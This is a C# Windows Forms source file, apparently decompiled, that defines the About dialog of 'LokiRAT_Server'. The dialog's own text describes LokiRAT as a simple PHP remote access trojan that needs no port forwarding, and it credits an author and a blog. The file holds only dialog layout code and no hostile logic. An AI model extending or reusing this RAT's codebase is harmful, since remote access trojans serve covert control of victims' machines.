namespace LokiRAT_Server
{
    using System;
    using System.ComponentModel;
    using System.Drawing;
    using System.Windows.Forms;

    public class about : Form
    {
        private IContainer components = null;
        private Label label1;
        private Label label2;
        private LinkLabel linkLabel1;
        private PictureBox pictureBox1;

        public about()
        {
            this.InitializeComponent();
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && (this.components != null))
            {
                this.components.Dispose();
            }
            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            ComponentResourceManager manager = new ComponentResourceManager(typeof(about));
            this.pictureBox1 = new PictureBox();
            this.label1 = new Label();
            this.label2 = new Label();
            this.linkLabel1 = new LinkLabel();
            ((ISupportInitialize) this.pictureBox1).BeginInit();
            base.SuspendLayout();
            this.pictureBox1.Anchor = AnchorStyles.Right | AnchorStyles.Top;
            this.pictureBox1.Image = (Image) manager.GetObject("pictureBox1.Image");
            this.pictureBox1.Location = new Point(0x1f, 12);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new Size(0x12e, 0x63);
            this.pictureBox1.TabIndex = 1;
            this.pictureBox1.TabStop = false;
            this.label1.AutoSize = true;
            this.label1.Location = new Point(0x18, 0x7b);
            this.label1.Name = "label1";
            this.label1.Size = new Size(0x139, 13);
            this.label1.TabIndex = 2;
            this.label1.Text = "LokiRAT is simple PHP RAT, which doesn't require Port Forward.";
            this.label2.AutoSize = true;
            this.label2.ForeColor = SystemColors.HotTrack;
            this.label2.Location = new Point(0xed, 0x8d);
            this.label2.Name = "label2";
            this.label2.Size = new Size(0x60, 13);
            this.label2.TabIndex = 3;
            this.label2.Text = "Coded by wulmbos";
            this.linkLabel1.AutoSize = true;
            this.linkLabel1.Location = new Point(0xed, 0xdd);
            this.linkLabel1.Name = "linkLabel1";
            this.linkLabel1.Size = new Size(0x73, 13);
            this.linkLabel1.TabIndex = 4;
            this.linkLabel1.TabStop = true;
            this.linkLabel1.Text = "LokiRAT.blogspot.com";
            base.AutoScaleDimensions = new SizeF(6f, 13f);
            base.AutoScaleMode = AutoScaleMode.Font;
            base.ClientSize = new Size(0x16c, 0xf3);
            base.Controls.Add(this.linkLabel1);
            base.Controls.Add(this.label2);
            base.Controls.Add(this.label1);
            base.Controls.Add(this.pictureBox1);
            base.FormBorderStyle = FormBorderStyle.FixedDialog;
            base.Name = "about";
            this.Text = "About | LokiRAT";
            ((ISupportInitialize) this.pictureBox1).EndInit();
            base.ResumeLayout(false);
            base.PerformLayout();
        }
    }
}

